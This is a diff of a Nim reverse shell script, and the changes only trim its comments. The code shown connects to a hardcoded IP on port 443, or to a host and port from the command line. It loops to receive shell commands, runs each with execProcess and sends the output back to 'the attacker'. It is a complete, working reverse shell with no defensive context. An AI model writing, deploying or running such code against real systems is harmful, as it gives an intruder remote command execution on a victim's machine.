@@ -3,14 +3,14 @@ import osproc # this comes with execProcess, which returns the output of the com
 import os
 import strutils
  
-# these are the default connection parameters for the reverse shell, but can be overwritten with command-line args
+#  default connection parameters for the reverse shell, but can be overwritten with command-line args
 var ip = "192.168.182.129"
 var port = 443
  
 
-var args = commandLineParams() # returns a sequence (similar to a Python list) of the CLI arguments
+var args = commandLineParams() # returns a sequence of the CLI arguments
  
-# if arguments have been provided, assume they are an IP and port and overwrite the default IP/port values
+# if arguments have been provided, it will overwrite the default IP/port values
 if args.len() == 2:
     ip = args[0]
     port = parseInt(args[1])
@@ -21,11 +21,11 @@ echo "Attempting to connect to ", ip, " on port ", port, "..."
  
 
 while true:
-# attempt to connect to the attacker's host
+# attempt to connect to the attacker
     try:
         socket.connect(ip, Port(port))
         
-        # if the connection succeeds, begin the logic for receiving and executing commands from the attacker
+        # if the connection succeeds, begin the logic for receiving and executing commands
         while true:
             try:
                 
@@ -34,7 +34,7 @@ while true:
                 var result = execProcess(command) # execProcess() returns the output of a shell command as a string
                 socket.send(result) # send the results of the command to the attacker
             
-            # if the attacker forgets they're in a reverse shell and tries to ctrl+c, which they inevitably will, close the socket and quit the program    
+            # if the attacker tries to ctrl+c, close the socket and quit the program    
             except:
                 echo "Connection lost, quitting..."
                 socket.close()
